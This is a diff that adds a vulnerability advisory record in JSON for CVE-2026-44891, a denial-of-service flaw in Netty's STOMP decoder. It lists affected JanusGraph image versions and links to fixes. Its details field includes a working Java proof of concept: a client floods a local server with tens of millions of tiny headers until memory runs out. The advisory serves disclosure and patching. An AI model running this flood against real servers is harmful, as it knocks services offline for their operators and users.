@@ -1,0 +1,198 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-fmki-w3wh-wsej-v7e7",
+  "modified": "2026-11-10T08:26:00Z",
+  "published": "2026-11-10T08:26:00Z",
+  "upstream": [
+    "CVE-2026-44891"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\nThe StompSubframeDecoder fails to limit the total number of headers or their cumulative size per frame, allowing an attacker to cause an OutOfMemoryError, leading to a Denial of Service.\n\n### Details\n`io.netty.handler.codec.stomp.StompSubframeDecoder` implements the STOMP protocol. The `maxLineLength` parameter restricts the length of individual header lines, but there is no mechanism to limit the total number of headers in a single STOMP frame. An attacker can send a large number of short headers (e.g., `a: 1\\n`), which are accumulated in memory inside the `DefaultStompHeadersSubframe` until the JVM throws an OutOfMemoryError.\n\n### PoC\nRun the server with `-Xmx256m`\n\n```java\npublic final class ServerApp {\n    public static void main(String[] args) throws Exception {\n        EventLoopGroup group = new MultiThreadIoEventLoopGroup(NioIoHandler.newFactory());\n        try {\n            ChannelFuture serverFuture = new ServerBootstrap()\n                    .group(group)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new StompSubframeDecoder())\n                    .bind(8080)\n                    .sync();\n            serverFuture.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}\n```\n\n```java\npublic final class ClientApp {\n    public static void main(String[] args) throws Exception {\n        try (Socket socket = new Socket(\"127.0.0.1\", 8080)) {\n            OutputStream out = socket.getOutputStream();\n\n            out.write(\"CONNECT\\n\".getBytes(StandardCharsets.UTF_8));\n\n            StringBuilder sb = new StringBuilder();\n            for (int i = 0; i < 1000; i++) {\n                sb.append(\"a:1\\n\");\n            }\n            byte[] bulkHeaders = sb.toString().getBytes(StandardCharsets.UTF_8);\n\n            for (int i = 1; i <= 50_000; i++) {\n                out.write(bulkHeaders);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n### Impact\nDenial of Service: An attacker can easily exhaust the server's memory by sending a single malicious STOMP message. Any server exposing a STOMP endpoint based on StompSubframeDecoder is vulnerable to DoS.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "janusgraph-1.0",
+        "purl": "pkg:apk/dhi/janusgraph-1.0"
+      },
+      "versions": [
+        "1.0.1-r0",
+        "1.0.1-r1",
+        "1.0.1-r10",
+        "1.0.1-r11",
+        "1.0.1-r2",
+        "1.0.1-r3",
+        "1.0.1-r4",
+        "1.0.1-r5",
+        "1.0.1-r6",
+        "1.0.1-r7",
+        "1.0.1-r8",
+        "1.0.1-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "janusgraph-1.1",
+        "purl": "pkg:apk/dhi/janusgraph-1.1"
+      },
+      "versions": [
+        "1.1.0-r0",
+        "1.1.0-r1",
+        "1.1.0-r10",
+        "1.1.0-r11",
+        "1.1.0-r12",
+        "1.1.0-r2",
+        "1.1.0-r3",
+        "1.1.0-r4",
+        "1.1.0-r5",
+        "1.1.0-r6",
+        "1.1.0-r7",
+        "1.1.0-r8",
+        "1.1.0-r9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "janusgraph-1.2",
+        "purl": "pkg:apk/dhi/janusgraph-1.2"
+      },
+      "versions": [
+        "1.2.0-r0",
+        "1.2.0-r1",
+        "1.2.0-r2",
+        "1.2.0-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "janusgraph-1.0",
+        "purl": "pkg:deb/dhi/janusgraph-1.0"
+      },
+      "versions": [
+        "1.0.1-0",
+        "1.0.1-1",
+        "1.0.1-10",
+        "1.0.1-11",
+        "1.0.1-12",
+        "1.0.1-13",
+        "1.0.1-2",
+        "1.0.1-3",
+        "1.0.1-4",
+        "1.0.1-5",
+        "1.0.1-6",
+        "1.0.1-7",
+        "1.0.1-8",
+        "1.0.1-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "janusgraph-1.1",
+        "purl": "pkg:deb/dhi/janusgraph-1.1"
+      },
+      "versions": [
+        "1.1.0-0",
+        "1.1.0-1",
+        "1.1.0-10",
+        "1.1.0-11",
+        "1.1.0-12",
+        "1.1.0-13",
+        "1.1.0-14",
+        "1.1.0-2",
+        "1.1.0-3",
+        "1.1.0-4",
+        "1.1.0-5",
+        "1.1.0-6",
+        "1.1.0-7",
+        "1.1.0-8",
+        "1.1.0-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "janusgraph-1.2",
+        "purl": "pkg:deb/dhi/janusgraph-1.2"
+      },
+      "versions": [
+        "1.2.0-0",
+        "1.2.0-1",
+        "1.2.0-2",
+        "1.2.0-3",
+        "1.2.0-4",
+        "1.2.0-5",
+        "1.2.0-6"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-fmki-w3wh-wsej-v7e7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-vhch-2wf3-m8rp"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/netty/netty/security/advisories/GHSA-vhch-2wf3-m8rp"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://security-tracker.debian.org/tracker/CVE-2026-44891"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://ubuntu.com/security/CVE-2026-44891"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "http://people.ubuntu.com/~ubuntu-security/cve/CVE-2026-44891"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/netty/netty/pull/17065"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/netty/netty/pull/17063"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/netty/netty/commit/bb2ff68a1fb71cb4b0eb9a9e17b66c52aff680c6"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/netty/netty/commit/5b68c61f37aa4a3045cba624cbea239655c9003b"
+    }
+  ]
+}
